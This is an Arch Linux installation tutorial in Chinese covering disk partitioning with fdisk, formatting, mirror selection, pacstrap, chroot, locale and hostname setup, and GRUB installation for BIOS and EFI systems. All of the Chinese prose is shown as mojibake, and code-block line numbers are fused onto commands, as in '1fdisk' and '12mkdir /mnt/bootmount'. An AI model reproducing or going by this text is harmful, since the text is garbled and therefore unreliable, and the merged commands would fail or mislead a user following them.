æ˜¯EFI/GPTæ–¹å¼å¼•å¯¼ï¼Œä½†æ˜¯æ²¡æœ‰è¿™ä¸ªè¾ƒå°çš„å¹¶ä¸”ç±»åž‹ä¸ºEFIçš„å¼•å¯¼åˆ†åŒºï¼ˆè¿™ç§æƒ…å†µä¸€èˆ¬åªä¼šå‡ºçŽ°åœ¨æ–°çš„ç¡¬ç›˜ï¼‰ï¼Œé‚£ä¹ˆä½ éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªå¼•å¯¼åˆ†åŒºã€‚ åˆ›å»ºä¸€ä¸ªå¼•å¯¼åˆ†åŒºï¼ˆä»…ä¸Šé¢æ‰€åˆ—çš„ç¬¬ä¸‰ç§æƒ…å†µéœ€è¦è¿›è¡Œè¿™æ­¥ï¼‰æ‰§è¡Œå‘½ä»¤ï¼š 1fdisk /dev/sdx ï¼ˆè¯·å°†sdxæ›¿æ¢æˆä½ è¦æ“ä½œçš„ç£ç›˜å¦‚sdb sdcç­‰ï¼‰ ä¸‹é¢ä½ å°±è¿›å…¥äº†fdiskçš„æ“ä½œçŽ¯å¢ƒï¼Œ è¾“å…¥må¹¶å›žè½¦å¯ä»¥æŸ¥çœ‹å„å‘½ä»¤çš„ä½œç”¨ã€‚ å¦‚æžœä½ æ˜¯ä¸€å—å…¨æ–°çš„ç¡¬ç›˜ï¼šè¾“å…¥gæ¥åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„gptåˆ†åŒºè¡¨ï¼Œå¦åˆ™ç›´æŽ¥è¿›è¡Œç¬¬2æ­¥ã€‚ è¾“å…¥nåˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†åŒºï¼Œé¦–å…ˆä¼šè®©ä½ é€‰æ‹©èµ·å§‹æ‰‡åŒºï¼Œä¸€èˆ¬ç›´æŽ¥å›žè½¦ä½¿ç”¨é»˜è®¤æ•°å€¼å³å¯ï¼Œç„¶åŽå¯ä»¥è¾“å…¥ç»“æŸæ‰‡åŒºæˆ–æ˜¯åˆ†åŒºå¤§å°ï¼Œè¿™é‡Œæˆ‘ä»¬è¾“å…¥+512Mæ¥åˆ›å»ºä¸€ä¸ª512Mçš„å¼•å¯¼åˆ†åŒºã€‚ è¿™æ—¶æˆ‘ä»¬å¯ä»¥è¾“å…¥pæ¥æŸ¥çœ‹æ–°åˆ›å»ºçš„åˆ†åŒºã€‚ è¾“å…¥tå¹¶é€‰æ‹©æ–°åˆ›å»ºçš„åˆ†åŒºåºå·æ¥æ›´æ”¹åˆ†åŒºçš„ç±»åž‹ï¼Œè¾“å…¥lå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„ç±»åž‹ï¼Œè¾“å…¥efæ›´æ”¹åˆ†åŒºçš„ç±»åž‹ä¸ºEFIã€‚ è¾“å…¥wæ¥å°†ä¹‹å‰æ‰€æœ‰çš„æ“ä½œå†™å…¥ç£ç›˜ç”Ÿæ•ˆï¼Œåœ¨è¿™ä¹‹å‰å¯ä»¥è¾“å…¥pæ¥ç¡®è®¤è‡ªå·±çš„åˆ†åŒºè¡¨æ²¡æœ‰é”™è¯¯ã€‚ è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æ ¼å¼åŒ–åˆšåˆšåˆ›å»ºçš„å¼•å¯¼åˆ†åŒºï¼š 1mkfs.fat -F32 /dev/sdxY ï¼ˆè¯·å°†sdxYæ›¿æ¢ä¸ºåˆšåˆ›å»ºçš„åˆ†åŒºï¼‰ çŽ°åœ¨å¼•å¯¼åˆ†åŒºå°±åˆ›å»ºå¥½äº†ã€‚ åˆ›å»ºæ ¹åˆ†åŒºè¾“å…¥å‘½ä»¤ï¼š 1fdisk /dev/sdx ï¼ˆè¯·å°†sdxæ›¿æ¢æˆä½ è¦æ“ä½œçš„ç£ç›˜å¦‚sdb sdcç­‰ï¼‰ å¦‚æžœä½ æ˜¯ä¸€å—å…¨æ–°çš„ç¡¬ç›˜ï¼ˆå¦åˆ™ç›´æŽ¥è¿›è¡Œç¬¬2æ­¥ï¼‰ï¼š å¦‚æžœä½ æ˜¯BIOS/MBRå¼•å¯¼æ–¹å¼ï¼šè¾“å…¥oæ¥åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„MBRåˆ†åŒºè¡¨ã€‚ å¦‚æžœä½ åœ¨ä¸Šä¸€æ­¥æ–°å»ºäº†åˆ†åŒºè¡¨å¹¶åˆ›å»ºäº†å¼•å¯¼åˆ†åŒºï¼šç›´æŽ¥è¿›è¡Œæ­¥éª¤2ã€‚ å¦‚æžœä½ åœ¨å¦ä¸€å—ç¡¬ç›˜ä¸­å·²ç»æœ‰å¼•å¯¼åˆ†åŒºï¼šè¾“å…¥gæ¥åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„gptåˆ†åŒºè¡¨ã€‚ è¾“å…¥nåˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†åŒºï¼Œé¦–å…ˆä¼šè®©ä½ é€‰æ‹©èµ·å§‹æ‰‡åŒºï¼Œä¸€èˆ¬ç›´æŽ¥å›žè½¦ä½¿ç”¨é»˜è®¤æ•°å€¼å³å¯ï¼Œç„¶åŽå¯ä»¥è¾“å…¥ç»“æŸæ‰‡åŒºæˆ–æ˜¯åˆ†åŒºå¤§å°ï¼Œå¦‚æžœæˆ‘ä»¬æƒ³è¦ä½¿åˆ›å»ºçš„åˆ†åŒºå®Œå…¨å æ»¡ç©ºé—²çš„ç©ºé—´ï¼Œå¯ä»¥ç›´æŽ¥å›žè½¦ä½¿ç”¨é»˜è®¤ç»“æŸæ‰‡åŒºã€‚ è¿™æ—¶æˆ‘ä»¬å¯ä»¥è¾“å…¥pæ¥æŸ¥çœ‹æ–°åˆ›å»ºçš„åˆ†åŒºã€‚ è¾“å…¥wæ¥å°†ä¹‹å‰æ‰€æœ‰çš„æ“ä½œå†™å…¥ç£ç›˜ç”Ÿæ•ˆï¼Œåœ¨è¿™ä¹‹å‰å¯ä»¥è¾“å…¥pæ¥ç¡®è®¤è‡ªå·±çš„åˆ†åŒºè¡¨æ²¡æœ‰é”™è¯¯ã€‚ è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æ ¼å¼åŒ–åˆšåˆšåˆ›å»ºçš„æ ¹åˆ†åŒºï¼š 1mkfs.ext4 /dev/sdxY ï¼ˆè¯·å°†çš„sdxYæ›¿æ¢ä¸ºåˆšåˆ›å»ºçš„åˆ†åŒºï¼‰ è¿™æ˜¯æˆ‘çš„åˆ†åŒºè¿‡ç¨‹ä¾›å‚è€ƒï¼š æŒ‚è½½åˆ†åŒºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†æ ¹åˆ†åŒºæŒ‚è½½åˆ°/mntï¼š 1mount /dev/sdxY /mnt ï¼ˆè¯·å°†sdxYæ›¿æ¢ä¸ºä¹‹å‰åˆ›å»ºçš„æ ¹åˆ†åŒºï¼‰ å¦‚æžœä½ æ˜¯EFI/GPTå¼•å¯¼æ–¹å¼ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»º/bootæ–‡ä»¶å¤¹å¹¶å°†å¼•å¯¼åˆ†åŒºæŒ‚è½½åˆ°ä¸Šé¢ã€‚BIOS/MBRå¼•å¯¼æ–¹å¼æ— éœ€è¿›è¡Œè¿™æ­¥ã€‚ 12mkdir /mnt/bootmount /dev/sdxY /mnt/boot ï¼ˆè¯·å°†sdxYæ›¿æ¢ä¸ºä¹‹å‰åˆ›å»ºæˆ–æ˜¯å·²ç»å­˜åœ¨çš„å¼•å¯¼åˆ†åŒºï¼‰ é€‰æ‹©é•œåƒæºå› ä¸ºä»Žè¿™æ­¥å¼€å§‹ï¼Œéœ€è¦è¿›è¡Œä¸€äº›ç¼–è¾‘é…ç½®æ–‡ä»¶çš„æ“ä½œï¼Œæ‰€ä»¥éœ€è¦æŽŒæ¡ä¸€äº›å‘½ä»¤è¡Œä¸‹éžå¸¸è‘—åçš„ä¸€æ¬¾ç¼–è¾‘å™¨Vimçš„åŸºæœ¬æ“ä½œï¼Œåœ¨è¿™é‡ŒæŽ¨èå­¦ä¹ ä¸‹é¢è¿™ä¸ªé“¾æŽ¥ä¸­çš„å­˜æ´»éƒ¨åˆ†ï¼Œå¯ä»¥å®Œæˆç¼–è¾‘ã€å¤åˆ¶ç²˜è´´ä¸Žä¿å­˜å·¥ä½œå³å¯ã€‚ http://coolshell.cn/articles/5426.html é•œåƒæºæ˜¯æˆ‘ä»¬ä¸‹è½½çš„è½¯ä»¶åŒ…çš„æ¥æºï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®è‡ªå·±çš„åœ°åŒºé€‰æ‹©ä¸åŒçš„æºæ¥åŠ å¿«ä¸‹è½½çš„é€Ÿåº¦ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç”¨Vimæ¥ç¼–è¾‘/etc/pacman.d/mirrorlistè¿™ä¸ªæ–‡ä»¶ 1vim /etc/pacman.d/mirrorlist æç¤ºï¼šè¾“å…¥è·¯å¾„æ—¶å¯ä»¥ç”¨Tabé”®è¡¥å…¨ æ‰¾åˆ°æ ‡æœ‰Chinaçš„é•œåƒæºï¼Œnormalæ¨¡å¼ä¸‹æŒ‰ä¸‹ddå¯ä»¥å‰ªåˆ‡å…‰æ ‡ä¸‹çš„è¡Œï¼ŒæŒ‰ggå›žåˆ°æ–‡ä»¶é¦–ï¼ŒæŒ‰Pï¼ˆæ³¨æ„æ˜¯å¤§å†™çš„ï¼‰å°†è¡Œç²˜è´´åˆ°æ–‡ä»¶æœ€å‰é¢çš„ä½ç½®ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç›´æŽ¥æ‰‹å·¥è¾“å…¥ã€‚ è¿™é‡ŒæŽ¨èä½¿ç”¨æ¸…åŽã€æµ™å¤§æºï¼š 12Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$archServer = http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch æœ€åŽè®°å¾—ç”¨:wqå‘½ä»¤ä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºã€‚ å®‰è£…åŸºæœ¬åŒ…ä¸‹é¢å°±è¦å®‰è£…æœ€åŸºæœ¬çš„ArchLinuxåŒ…åˆ°ç£ç›˜ä¸Šäº†ã€‚è¿™æ˜¯ä¸€ä¸ªè”ç½‘ä¸‹è½½å¹¶å®‰è£…çš„è¿‡ç¨‹ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1pacstrap /mnt base base-devel æ ¹æ®ä¸‹è½½é€Ÿåº¦çš„ä¸åŒåœ¨è¿™é‡Œéœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå½“å‘½ä»¤æç¤ºç¬¦é‡æ–°å‡ºçŽ°çš„æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚ é…ç½®Fstabç”Ÿæˆè‡ªåŠ¨æŒ‚è½½åˆ†åŒºçš„fstabæ–‡ä»¶ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1genfstab -L /mnt &gt;&gt; /mnt/etc/fstab ç”±äºŽè¿™æ­¥æ¯”è¾ƒé‡è¦ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¾“å‡ºç”Ÿæˆçš„æ–‡ä»¶æ¥æ£€æŸ¥æ˜¯å¦æ­£ç¡®ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1cat /mnt/etc/fstab å¦‚å›¾ï¼Œå¯ä»¥çœ‹åˆ°/dev/sda4è¢«æŒ‚è½½åˆ°äº†æ ¹åˆ†åŒºã€‚ /dev/sda3æ˜¯æˆ‘ä¹‹å‰å­˜æ´»ä¸‹æ¥çš„å®¶ç›®å½•è¢«æŒ‚è½½åˆ°äº†/homeç›®å½•ï¼ˆä½ ä»¬æ²¡æœ‰è¿™æ¡ï¼‰ã€‚ å¦‚æžœæ˜¯EFI/GPTå¼•å¯¼çš„è¿˜åº”è¯¥æœ‰å¼•å¯¼åˆ†åŒºè¢«æŒ‚è½½åˆ°/bootç›®å½•ã€‚ ChrootChrootæ„ä¸ºChange rootï¼Œç›¸å½“äºŽæŠŠæ“çºµæƒäº¤ç»™æˆ‘ä»¬æ–°å®‰è£…ï¼ˆæˆ–å·²ç»å­˜åœ¨ï¼‰çš„Linuxç³»ç»Ÿï¼Œæ‰§è¡Œäº†è¿™æ­¥ä»¥åŽï¼Œæˆ‘ä»¬çš„æ“ä½œéƒ½ç›¸å½“äºŽåœ¨ç£ç›˜ä¸Šæ–°è£…çš„ç³»ç»Ÿä¸­è¿›è¡Œã€‚ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1arch-chroot /mnt è¿™é‡Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æžœä»¥åŽæˆ‘ä»¬çš„ç³»ç»Ÿå‡ºçŽ°äº†é—®é¢˜ï¼Œåªè¦æ’å…¥Uç›˜å¹¶å¯åŠ¨ï¼Œ å°†æˆ‘ä»¬çš„ç³»ç»Ÿæ ¹åˆ†åŒºæŒ‚è½½åˆ°äº†/mntä¸‹ï¼ˆå¦‚æžœæœ‰efiåˆ†åŒºä¹Ÿè¦æŒ‚è½½åˆ°/mnt/bootä¸‹ï¼‰ï¼Œå†é€šè¿‡è¿™æ¡å‘½ä»¤å°±å¯ä»¥è¿›å…¥æˆ‘ä»¬çš„ç³»ç»Ÿè¿›è¡Œä¿®å¤æ“ä½œã€‚ è®¾ç½®æ—¶åŒºä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è®¾ç½®æˆ‘ä»¬çš„æ—¶åŒºä¸ºä¸Šæµ·å¹¶ç”Ÿæˆç›¸å…³æ–‡ä»¶ï¼š 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc æå‰å®‰è£…å¿…é¡»è½¯ä»¶åŒ…å› ä¸ºæˆ‘ä»¬çŽ°åœ¨å·²ç»Chrootåˆ°äº†æ–°çš„ç³»ç»Ÿä¸­ï¼Œåªæœ‰ä¸€äº›æœ€åŸºæœ¬çš„åŒ…ï¼ˆç»„ä»¶ï¼‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦è‡ªå·±å®‰è£…æ–°çš„åŒ…äº†ï¼Œä¸‹é¢å°±è¦ä»‹ç»ä¸€ä¸‹ArchLinuxä¸‹éžå¸¸å¼ºå¤§çš„åŒ…ç®¡ç†å·¥å…·pacmanï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä¸€è¡Œå‘½ä»¤å°±å¯ä»¥æžå®šåŒ…ä¸Žä¾èµ–çš„é—®é¢˜ã€‚ å®‰è£…åŒ…çš„å‘½ä»¤æ ¼å¼ä¸ºpacman -S åŒ…åï¼Œpacmanä¼šè‡ªåŠ¨æ£€æŸ¥è¿™ä¸ªåŒ…æ‰€éœ€è¦çš„å…¶ä»–åŒ…ï¼ˆå³ä¸ºä¾èµ–ï¼‰å¹¶ä¸€èµ·è£…ä¸Šã€‚ä¸‹é¢æˆ‘ä»¬å°±é€šè¿‡pacmanæ¥å®‰è£…ä¸€äº›åŒ…ï¼Œè¿™äº›åŒ…åœ¨ä¹‹åŽä¼šç”¨ä¸Šï¼Œåœ¨è¿™é‡Œå…ˆæå‰è£…å¥½ã€‚ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager ä¸€è·¯ç¡®è®¤ä¹‹åŽåŒ…å°±è¢«æˆåŠŸè£…ä¸Šäº†ã€‚ å›¾ä¸­åªå®‰è£…äº†Vimå’Œå®ƒçš„ä¾èµ–ã€‚ è®¾ç½®Localeè®¾ç½®æˆ‘ä»¬ä½¿ç”¨çš„è¯­è¨€é€‰é¡¹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ¥ç¼–è¾‘/etc/locale.genæ–‡ä»¶ï¼š 1vim /etc/locale.gen åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°zh_CN.UTF-8 UTF-8 zh_HK.UTF-8 UTF-8 zh_TW.UTF-8 UTF-8 en_US.UTF-8 UTF-8è¿™å››è¡Œï¼ŒåŽ»æŽ‰è¡Œé¦–çš„#å·ï¼Œä¿å­˜å¹¶é€€å‡ºã€‚å¦‚å›¾ï¼š ç„¶åŽæ‰§è¡Œï¼š 1locale-gen æ‰“å¼€ï¼ˆä¸å­˜åœ¨æ—¶ä¼šåˆ›å»ºï¼‰/etc/locale.confæ–‡ä»¶ï¼š 1vim /etc/locale.conf åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š 1LANG=en_US.UTF-8 ä¿å­˜å¹¶é€€å‡ºã€‚ è®¾ç½®ä¸»æœºåæ‰“å¼€ï¼ˆä¸å­˜åœ¨æ—¶ä¼šåˆ›å»ºï¼‰/etc/hostnameæ–‡ä»¶ï¼š 1vim /etc/hostname åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œè¾“å…¥ä½ è‡ªå·±è®¾å®šçš„ä¸€ä¸ªmyhostname ä¿å­˜å¹¶é€€å‡ºã€‚ ç¼–è¾‘/etc/hostsæ–‡ä»¶ï¼š 1vim /etc/hosts ä½œå¦‚ä¸‹ä¿®æ”¹ï¼ˆå°†myhostnameæ›¿æ¢æˆä½ è‡ªå·±è®¾å®šçš„ä¸»æœºåï¼‰ 123127.0.0.1 localhost.localdomain localhost::1 localhost.localdomain localhost127.0.1.1 myhostname.localdomain myhostname è¿™é‡Œæˆ‘è®¾ç½®çš„æ˜¯viseatorã€‚ ä¿å­˜å¹¶é€€å‡ºã€‚ è®¾ç½®Rootå¯†ç Rootæ˜¯Linuxä¸­å…·æœ‰æœ€é«˜æƒé™å¸æˆ·ï¼Œæœ‰äº›æ•æ„Ÿçš„æ“ä½œå¿…é¡»é€šè¿‡Rootç”¨æˆ·è¿›è¡Œï¼Œæ¯”å¦‚ä½¿ç”¨pacmanï¼Œæˆ‘ä»¬ä¹‹å‰è¿›è¡Œæ‰€æœ‰çš„æ“ä½œä¹Ÿéƒ½æ˜¯ä»¥Rootç”¨æˆ·è¿›è¡Œçš„ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºRootçš„æƒé™è¿‡é«˜ï¼Œå¦‚æžœä½¿ç”¨ä¸å½“ä¼šé€ æˆå®‰å…¨é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹åŽä¼šæ–°å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·æ¥è¿›è¡Œæ—¥å¸¸çš„æ“ä½œã€‚åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸ºRootå¸æˆ·è®¾ç½®ä¸€ä¸ªå¯†ç ï¼š æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1passwd æŒ‰æç¤ºè®¾ç½®å¹¶ç¡®è®¤å°±å¯ä»¥äº†ã€‚ æˆ–è®¸æœ‰çš„äººå·²ç»å‘çŽ°å®˜æ–¹Wikiå’Œä¸€äº›å…¶ä»–æ•™ç¨‹èµ„æ–™ä¸­çš„å‘½ä»¤æ˜¯ä»¥#æˆ–$å¼€å¤´çš„ï¼Œè¿™ä¸¤ä¸ªç¬¦å·å°±å¯¹åº”ç€å‘½ä»¤è¡Œä¸­çš„å‘½ä»¤æç¤ºç¬¦ï¼Œ#ä»£è¡¨ä»¥Rootç”¨æˆ·æ‰§è¡Œå‘½ä»¤ï¼Œ$ä»£è¡¨ä»¥æ™®é€šç”¨æˆ·æ‰§è¡Œå‘½ä»¤ï¼Œå¹³æ—¶ä½¿ç”¨æ•™ç¨‹ä¸­çš„å‘½ä»¤æ—¶åº”è¯¥æ³¨æ„è¿™ä¸€ç‚¹ã€‚ å®‰è£…Intel-ucodeï¼ˆéžIntelCPUå¯ä»¥è·³è¿‡æ­¤æ­¥éª¤ï¼‰ç›´æŽ¥pacmanå®‰è£…ï¼š 1pacman -S intel-ucode å®‰è£…Bootloaderç»å¸¸å¬è¯´å¾ˆå¤šäººå› ä¸ºå¼•å¯¼é—®é¢˜å¯¼è‡´ç³»ç»Ÿå®‰è£…å¤±è´¥ï¼Œå¤šæ•°æ˜¯å› ä¸ºæ•™ç¨‹æ²¡æœ‰ç»Ÿä¸€æˆ–æ˜¯è¿‡æ—¶çš„æ•™ç¨‹å¼•èµ·çš„ï¼Œè¿™é‡Œåªè¦æŒ‰ç…§æ­¥éª¤æ¥å…¶å®žæ˜¯ä¸éš¾çš„ã€‚ è¿™é‡Œæˆ‘ä»¬å®‰è£…æœ€æµè¡Œçš„Grub2ã€‚ é¦–å…ˆå®‰è£…os-proberè¿™ä¸ªåŒ…ï¼Œå®ƒå¯ä»¥é…åˆGrubæ£€æµ‹å·²ç»å­˜åœ¨çš„ç³»ç»Ÿï¼Œè‡ªåŠ¨è®¾ç½®å¯åŠ¨é€‰é¡¹ã€‚ 1pacman -S os-prober å¦‚æžœä¸ºBIOS/MBRå¼•å¯¼æ–¹å¼ï¼š å®‰è£…grubåŒ…ï¼š 1pacman -S grub éƒ¨ç½²grubï¼š 1grub-install --target=i386-pc /dev/sdx ï¼ˆå°†sdxæ¢æˆä½ å®‰è£…çš„ç¡¬ç›˜ï¼‰ æ³¨æ„è¿™é‡Œçš„sdxåº”è¯¥ä¸ºç¡¬ç›˜ï¼ˆä¾‹å¦‚/dev/sdaï¼‰ï¼Œè€Œä¸æ˜¯å½¢å¦‚/dev/sda1è¿™æ ·çš„åˆ†åŒºã€‚ ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š 1grub-mkconfig -o /boot/grub/grub.cfg å¦‚æžœä½ æ²¡æœ‰çœ‹åˆ°å¦‚å›¾æ‰€ç¤ºçš„æç¤ºä¿¡æ¯ï¼Œè¯·ä»”ç»†æ£€æŸ¥æ˜¯å¦æ­£ç¡®å®Œæˆä¸Šé¢çš„è¿‡ç¨‹ã€‚ å¦‚æžœæŠ¥warning failed to connect to lvmetadï¼Œfalling back to device scanning.é”™è¯¯ã€‚å‚ç…§è¿™ç¯‡æ–‡ç« ï¼Œç®€å•çš„æ–¹æ³•æ˜¯ç¼–è¾‘/etc/lvm/lvm.confè¿™ä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°use_lvmetad = 1å°†1ä¿®æ”¹ä¸º0ï¼Œä¿å­˜ï¼Œé‡æ–°é…ç½®grubã€‚ å¦‚æžœä¸ºEFI/GPTå¼•å¯¼æ–¹å¼ï¼š å®‰è£…grubä¸Žefibootmgrä¸¤ä¸ªåŒ…ï¼š 1pacman -S grub efibootmgr éƒ¨ç½²grubï¼š 1grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š 1grub-mkconfig -o /boot/grub/grub.cfg æç¤ºä¿¡æ¯åº”ä¸Žä¸Šé¢çš„å›¾ç±»ä¼¼ï¼Œå¦‚æžœä½ å‘çŽ°é”™è¯¯ï¼Œè¯·ä»”ç»†æ£€æŸ¥æ˜¯å¦æ­£ç¡®å®Œæˆä¸Šé¢çš„è¿‡ç¨‹ã€‚ å¦‚æžœæŠ¥warning failed to connect to lvmetadï¼Œfalling back to device scanning.é”™è¯¯ã€‚å‚ç…§è¿™ç¯‡æ–‡ç« ï¼Œç®€å•çš„æ–¹æ³•æ˜¯ç¼–è¾‘/etc/lvm/lvm.confè¿™ä¸ªæ–‡ä»¶ï¼Œæ‰¾åˆ°use_lvmetad = 1å°†1ä¿®æ”¹ä¸º0ï¼Œä¿å­˜ï¼Œé‡æ–°é…ç½®grubã€‚ å¦‚æžœæŠ¥grub-probe: error: cannot find a GRUB drive for /dev/sdb1, check your device.mapç±»ä¼¼é”™è¯¯ï¼Œå¹¶ä¸”sdb1è¿™ä¸ªåœ°æ–¹æ˜¯ä½ çš„uç›˜ï¼Œè¿™æ˜¯uç›˜uefiåˆ†åŒºé€ æˆçš„é”™è¯¯ï¼Œå¯¹æˆ‘ä»¬çš„æ­£å¸¸å®‰è£…æ²¡æœ‰å½±å“ï¼Œå¯ä»¥ä¸ç”¨ç†ä¼šè¿™æ¡é”™è¯¯ã€‚ å®‰è£…åŽæ£€æŸ¥å¦‚æžœä½ æ˜¯å¤šç³»ç»Ÿï¼Œè¯·æ³¨æ„ä¸Šé¢ä¸€èŠ‚ä¸­å¯¹os-proberè¿™ä¸ªåŒ…çš„å®‰è£…ã€‚ å¼ºçƒˆå»ºè®®ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ£€æŸ¥æ˜¯å¦æˆåŠŸç”Ÿæˆå„ç³»ç»Ÿçš„å…¥å£ï¼Œå¦‚æžœæ²¡æœ‰æ­£å¸¸ç”Ÿæˆä¼šå‡ºçŽ°å¼€æœºæ²¡æœ‰ç³»ç»Ÿå…¥å£çš„æƒ…å†µï¼š 1vim /boot/grub/grub.cfg æ£€æŸ¥æŽ¥è¿‘æœ«å°¾çš„menuentryéƒ¨åˆ†æ˜¯å¦æœ‰windowsæˆ–å…¶ä»–ç³»ç»Ÿåå…¥å£ã€‚ä¸‹å›¾ä¾‹å­ä¸­æ˜¯Arch Linuxå…¥å£ä¸Žæ£€æµ‹åˆ°çš„windows10å…¥å£ï¼ˆå®‰è£…åœ¨/dev/sda1ï¼‰ï¼Œå…·ä½“æƒ…å†µå¯èƒ½æœ‰ä¸åŒï¼š å¦‚æžœä½ æ²¡æœ‰çœ‹åˆ°Arch Linuxç³»ç»Ÿå…¥å£æˆ–è€…è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·å…ˆæ£€æŸ¥/bootç›®å½•æ˜¯å¦æ­£ç¡®éƒ¨ç½²linuxå†…æ ¸ï¼š 12cd /bootls æŸ¥çœ‹æ˜¯å¦æœ‰initramfs-linux-fallback.img initramfs-linux.img intel-ucode.img vmlinuz-linuxè¿™å‡ ä¸ªæ–‡ä»¶ï¼Œå¦‚æžœéƒ½æ²¡æœ‰ï¼Œè¯´æ˜Žlinuxå†…æ ¸æ²¡æœ‰è¢«æ­£ç¡®éƒ¨ç½²ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯/bootç›®å½•æ²¡æœ‰è¢«æ­£ç¡®æŒ‚è½½å¯¼è‡´çš„ï¼Œç¡®è®¤/bootç›®å½•æ— è¯¯åŽï¼Œå¯ä»¥é‡æ–°éƒ¨ç½²linuxå†…æ ¸ï¼š 1pacman -S linux å†é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥æ‰¾åˆ°ç³»ç»Ÿå…¥å£ã€‚ å¦‚æžœä½ å·²ç»å®‰è£…os-proberåŒ…å¹¶ç”Ÿæˆé…ç½®æ–‡ä»¶åŽè¿˜æ˜¯æ²¡æœ‰ç”Ÿæˆå…¶ä»–ç³»ç»Ÿçš„å…¥å£ï¼š ä½ ç›®å‰å¤„çš„Uç›˜å®‰è£…çŽ¯å¢ƒä¸‹æœ‰å¯èƒ½æ— æ³•æ£€æµ‹åˆ°å…¶ä»–ç³»ç»Ÿçš„å…¥å£ï¼Œè¯·åœ¨ä¸‹ä¸€æ­¥ä¸­é‡å¯ç™»é™†ä¹‹åŽé‡æ–°è¿è¡Œï¼š1grub-mkconfig -o /boot/grub/grub.cfg å¦‚æžœè¿˜æ²¡æœ‰ç”Ÿæˆå…¶ä»–ç³»ç»Ÿçš„å…¥å£ï¼Œè¯·å‚ç…§ï¼š https://wiki.archlinux.org/index.php/GRUB/Tips_and_tricks#Combining_the_use_of_UUIDs_and_basic_scripting ç¼–è¾‘é…ç½®æ–‡ä»¶æ‰‹åŠ¨æ·»åŠ å¼•å¯¼çš„åˆ†åŒºå…¥å£ã€‚ é‡å¯æŽ¥ä¸‹æ¥ï¼Œä½ éœ€è¦è¿›è¡Œé‡å¯æ¥å¯åŠ¨å·²ç»å®‰è£…å¥½çš„ç³»ç»Ÿï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12exitreboot æ³¨æ„è¿™ä¸ªæ—¶å€™ä½ å¯èƒ½ä¼šå¡åœ¨æœ‰ä¸¤è¡Œæç¤ºçš„åœ°æ–¹æ— æ³•æ­£å¸¸å…³æœºï¼Œé•¿æŒ‰ç”µæºé”®å¼ºåˆ¶å…³æœºå³å¯ï¼Œæ²¡æœ‰å½±å“ã€‚ å…³æœºåŽæ‹”å‡ºUç›˜ï¼Œå¯åŠ¨é¡ºåºä¼šè‡ªåŠ¨ä»¥ç¡¬ç›˜å¯åŠ¨ï¼Œå¦‚æžœä¸€åˆ‡é¡ºåˆ©ï¼Œé‚£ä¹ˆä½ å°†ä¼šçœ‹åˆ°ä¸‹é¢çš„ç•Œé¢ï¼š å¯åŠ¨æ—¶æœ‰å¯èƒ½ä¼šæœ‰è¾“å‡ºä¿¡æ¯æ˜¾ç¤ºåœ¨è¿™é‡Œï¼Œç›´æŽ¥å›žè½¦å°±å¯ä»¥äº†ã€‚ è¾“å…¥rootï¼Œå†è¾“å…¥ä¹‹å‰è®¾ç½®çš„å¯†ç ï¼Œæ˜¾ç¤ºå‡ºå‘½ä»¤æç¤ºç¬¦ï¼Œæ­å–œä½ ï¼Œä½ å·²ç»æˆåŠŸå®‰è£…ArchLinuxï¼ 